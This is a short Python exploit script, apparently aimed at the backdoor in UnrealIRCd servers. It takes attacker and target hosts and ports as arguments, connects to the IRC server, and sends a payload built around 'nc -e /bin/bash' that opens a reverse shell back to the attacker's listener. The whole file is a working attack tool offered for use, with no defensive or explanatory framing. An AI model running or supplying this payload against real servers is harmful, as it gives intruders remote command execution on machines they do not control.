#!/usr/bin/python

import socket
import sys
import time



def exploit():
    if len(sys.argv) < 5:
        sys.exit('BUUUMBA-CLARRRT!\n\nUsage: %s lhost lport rhost rport' % sys.argv[0])
    
    payload="AB; nc -e /bin/bash "+sys.argv[1]+" "+sys.argv[2]+" &"
    print("[*] payload: "+payload)
    host = sys.argv[3]
    port = sys.argv[4]
    print("[*] UnrealIRC Sever: "+host+" "+port)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, int(port)))
    print('[*] Connecting to irc server')
    s.recv(1024)
    time.sleep(1)
    s.recv(1024)
    print('[*] Sending payload\r[*] Shell inbound...')
    s.send(payload)
    print s.recv(1024)
    print("[*] done")
    s.close()


exploit()
